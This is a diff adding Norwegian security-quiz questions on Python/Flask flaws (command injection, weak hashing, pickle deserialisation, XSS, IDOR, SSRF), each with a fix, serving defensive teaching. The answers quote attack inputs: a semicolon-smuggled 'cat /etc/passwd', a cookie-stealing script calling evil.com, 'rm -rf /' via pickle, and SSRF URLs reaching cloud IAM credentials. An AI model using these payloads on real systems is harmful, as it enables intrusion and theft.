@@ -151,7 +151,7 @@
 <section id="quiz">
   <div class="container">
     <h2>Test deg <em>selv</em></h2>
-    <p class="section-intro">30 spørsmål — fra definisjon til angrepsscenario.</p>
+    <p class="section-intro">38 spørsmål — fra definisjon til angrepsscenario, inkludert kode-spot-the-vuln i Python.</p>
 
     <div class="quiz" data-quiz>
       <div class="q-label">Spørsmål 1 · Lett</div>
@@ -361,6 +361,62 @@
       <div class="q-text">Forklar hvorfor <code>Content-Security-Policy: script-src 'self' 'unsafe-inline'</code> i praksis er ekvivalent med å ikke ha CSP for XSS-formål.</div>
       <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
       <div class="answer"><code>'unsafe-inline'</code> tillater alle inline <code>&lt;script&gt;</code>-tagger og <code>onclick=</code>-attributter — som er nettopp det stored og reflected XSS injiserer. CSP-en blokkerer dermed ingenting den var ment å blokkere; den eneste effekten er at scripts fra eksterne domener nektes (som ofte ikke er XSS-vektoren uansett).<br><br>For at CSP skal være effektiv mot XSS må <code>'unsafe-inline'</code> droppes. Inline scripts erstattes med eksterne script-filer, eller gis nonce / hash som CSP-en eksplisitt tillater (<code>script-src 'self' 'nonce-rAnd0m'</code>). For DOM-XSS bør <code>require-trusted-types-for 'script'</code> legges til.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 31 · Vanskelig</div>
+      <div class="q-text">Spot bug. Hva er sårbarheten i denne Python-koden, og hva er fixen? <code>import os; os.system("ping " + request.args.get("host"))</code></div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><strong>Sårbarhet:</strong> OS command injection. <code>os.system</code> sender hele strengen til shell. En angriper sender <code>?host=8.8.8.8; cat /etc/passwd</code>, semikolonet skiller kommandoer og <code>cat</code> kjøres med serverens rettigheter.<br><br><strong>Fix:</strong> bruk <code>subprocess.run</code> med argumentliste og <code>shell=False</code>, og valider input først:<br><br><code>import ipaddress, subprocess<br>ipaddress.ip_address(host)  # kaster ved ugyldig format<br>subprocess.run(["ping", "-c", "4", host], shell=False, capture_output=True)</code><br><br>Med argumenter som liste tolker ikke shell tegnene <code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>$()</code> osv. — de passeres som rene argumenter til ping.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 32 · Middels</div>
+      <div class="q-text">Spot bug. Er denne Python-koden trygg passordlagring? <code>import hashlib; stored = hashlib.sha256(password.encode()).hexdigest()</code></div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">Nei. Tre feil:<br>1. <strong>SHA-256 er for rask</strong> — designet for hastighet, ikke for å motstå brute-force. Moderne GPU klarer milliarder av hashes/sek.<br>2. <strong>Ingen salt</strong> — to brukere med samme passord får identisk hash. Rainbow tables fungerer.<br>3. <strong>Ingen pepper</strong> — ved DB-lekkasje har angriperen alt hen trenger til offline-angrep.<br><br><strong>Fix:</strong><br><code>import bcrypt<br>stored = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))<br># verifiser:<br>bcrypt.checkpw(input_password.encode(), stored)</code><br><br>bcrypt (eller Argon2id) er treg by design (cost-faktor 12 = ~250 ms), genererer unik salt per passord, og kan kombineres med pepper hentet fra secrets manager.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 33 · Vanskelig</div>
+      <div class="q-text">Spot bug. En Flask-app gjør <code>data = pickle.loads(request.data)</code> for å motta serialisert state fra klient. Hva er angrepsvektoren?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><strong>Angrepsvektor:</strong> usikker deserialisering (A08:2025). Python <code>pickle.loads</code> kan kjøre vilkårlig kode under deserialisering — pickle-formatet inkluderer <code>__reduce__</code>-metoden som lar et objekt spesifisere hvilken funksjon som skal kalles ved restaurering. En angriper konstruerer et pickle-objekt som ved deserialisering kjører <code>os.system("rm -rf /")</code> eller laster ned en reverse shell. Direkte RCE.<br><br><strong>Fix:</strong> bruk aldri <code>pickle.loads</code> på data fra ukjente kilder. Bytt til JSON for ren data:<br><br><code>import json<br>data = json.loads(request.data)  # bare primitiver, ingen kodeeksekv.</code><br><br>Hvis du <em>må</em> serialisere komplekse objekter, bruk Protocol Buffers eller MessagePack med eksplisitt schema-validering. For pickle-bruk internt: signer dataene med HMAC og verifiser før deserialisering.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 34 · Middels</div>
+      <div class="q-text">Forklar de tre kategoriene av autentiseringsfaktorer, og hvorfor MFA krever faktorer fra <em>forskjellige</em> kategorier.</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">De tre klassiske kategoriene:<br><strong>1. Noe du vet:</strong> passord, PIN, sikkerhetsspørsmål. Lett å implementere, men lett å gjette / lekke / phishe.<br><strong>2. Noe du har:</strong> BankID-brikke, mobiltelefon (TOTP-app, SMS), FIDO2-nøkkel. Hard å fjernhacke, men kan stjeles eller mistes.<br><strong>3. Noe du er:</strong> biometri (fingeravtrykk, ansikt, stemme). Hard å forfalske, men kan ikke byttes ut og har false positive/negative-rate.<br><br><strong>Hvorfor forskjellige kategorier:</strong> to passord (vet + vet) er ikke MFA — én phishing-angrep tar begge. Passord + TOTP fra app (vet + har) er ekte MFA: angriperen må både phishe passordet <em>og</em> stjele/kompromittere telefonen. Hver ekstra kategori multipliserer angrepskostnaden.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 35 · Lett</div>
+      <div class="q-text">Hvorfor er det en dårlig idé å tvinge brukere til å bytte passord hver 30. dag?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">Aging-policy med kort intervall fører til forutsigbare omgåelser: brukere setter <code>julia03</code> for mars, <code>julia04</code> for april, <code>julia05</code> for mai. Den nye «hemmelige» variabelen er måneden — ikke faktisk hemmelig. NIST og NCSC anbefaler i dag å <em>ikke</em> kreve regelmessig endring uten konkret mistanke om kompromittering. I stedet: lange, sterke passord (eller passphrases), passordmanager, MFA, og endring kun ved tegn på kompromittering. NTNU har samme tilnærming: minst hvert 2. år, og umiddelbart ved mistanke.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 36 · Vanskelig</div>
+      <div class="q-text">Spot bug. En Flask-rute returnerer søkeresultater. Hva er sårbarheten, og hva er fixen? <code>@app.route('/search')<br>def search():<br>&nbsp;&nbsp;q = request.args.get('q', '')<br>&nbsp;&nbsp;return f"&lt;h1&gt;Du søkte på: {q}&lt;/h1&gt;"</code></div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><strong>Sårbarhet:</strong> Reflected XSS (A05:2025). <code>q</code> kommer rett fra URL-en og settes inn i HTML uten escaping. En angriper sender en lenke som <code>/search?q=&lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;</code>; offerets nettleser kjører skriptet i kontekst av domenet og lekker session-cookien.<br><br><strong>Fix:</strong> bruk en mal-motor med auto-escaping i stedet for f-string:<br><br><code>from flask import render_template<br>@app.route('/search')<br>def search():<br>&nbsp;&nbsp;q = request.args.get('q', '')<br>&nbsp;&nbsp;return render_template('search.html', q=q)</code><br><br>I templaten: <code>&lt;h1&gt;Du søkte på: {{ q }}&lt;/h1&gt;</code> — Jinja2 escaper automatisk <code>&lt; &gt; &amp; " '</code> til HTML-entiteter. Aldri bruk <code>{{ q | safe }}</code> på brukerinput. Sett <code>HttpOnly</code> og <code>SameSite=Lax</code> på session-cookien som dypforsvar.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 37 · Vanskelig</div>
+      <div class="q-text">Spot bug. Hvilken OWASP-kategori er denne Flask-koden sårbar for, og hvordan fikser du den?<br><code>@app.route('/api/invoices/&lt;int:invoice_id&gt;')<br>@login_required<br>def get_invoice(invoice_id):<br>&nbsp;&nbsp;invoice = Invoice.query.get_or_404(invoice_id)<br>&nbsp;&nbsp;return jsonify(invoice.to_dict())</code></div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><strong>Sårbarhet:</strong> IDOR / Broken Access Control (A01:2025). <code>@login_required</code> sjekker bare at brukeren er innlogget — ikke at brukeren <em>eier</em> fakturaen. En angriper med <code>user_id=42</code> kan iterere <code>/api/invoices/1</code>, <code>/2</code>, <code>/3</code> og laste ned alle andres fakturaer.<br><br><strong>Fix:</strong> legg eierskap inn i selve spørringen:<br><br><code>@app.route('/api/invoices/&lt;int:invoice_id&gt;')<br>@login_required<br>def get_invoice(invoice_id):<br>&nbsp;&nbsp;invoice = Invoice.query.filter_by(<br>&nbsp;&nbsp;&nbsp;&nbsp;id=invoice_id,<br>&nbsp;&nbsp;&nbsp;&nbsp;owner_id=current_user.id<br>&nbsp;&nbsp;).first_or_404()<br>&nbsp;&nbsp;return jsonify(invoice.to_dict())</code><br><br>Enten finnes en faktura med dette ID-et <em>og</em> denne eieren — eller ikke. Returner 404 ellers (ikke 403, som røper at ressursen finnes). Logg avviste tilgangsforsøk og alert ved enumerering (mange 404 fra én konto på kort tid).</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 38 · Middels</div>
+      <div class="q-text">Spot bug. Er denne Flask-koden trygg mot SSRF? <code>import requests<br>@app.route('/fetch')<br>def fetch():<br>&nbsp;&nbsp;url = request.args.get('url')<br>&nbsp;&nbsp;return requests.get(url).text</code></div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">Nei — klassisk SSRF (A01:2025). Brukeren kontrollerer URL-en; en angriper sender <code>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> og får serveren til å hente cloud-metadata med IAM-credentials. Eller <code>?url=http://10.0.0.5:5432</code> for å porte-skanne interne tjenester. Eller <code>?url=file:///etc/passwd</code> hvis HTTP-biblioteket støtter file://.<br><br><strong>Fix:</strong> allowlist eksplisitt:<br><br><code>from urllib.parse import urlparse<br>ALLOWED_HOSTS = {'cdn.example.com', 'images.example.com'}<br><br>@app.route('/fetch')<br>def fetch():<br>&nbsp;&nbsp;url = request.args.get('url', '')<br>&nbsp;&nbsp;parsed = urlparse(url)<br>&nbsp;&nbsp;if parsed.scheme not in ('http', 'https'):<br>&nbsp;&nbsp;&nbsp;&nbsp;abort(400)<br>&nbsp;&nbsp;if parsed.hostname not in ALLOWED_HOSTS:<br>&nbsp;&nbsp;&nbsp;&nbsp;abort(403)<br>&nbsp;&nbsp;return requests.get(url, timeout=5,<br>&nbsp;&nbsp;&nbsp;&nbsp;allow_redirects=False).text</code><br><br>Suppler med IMDSv2 på AWS, nettverkssegmentering som blokkerer 169.254.169.254 og RFC 1918-områder fra appserveren, og deaktivér file:// / gopher:// i HTTP-klienten.</div></div>
     </div>
 
   </div>
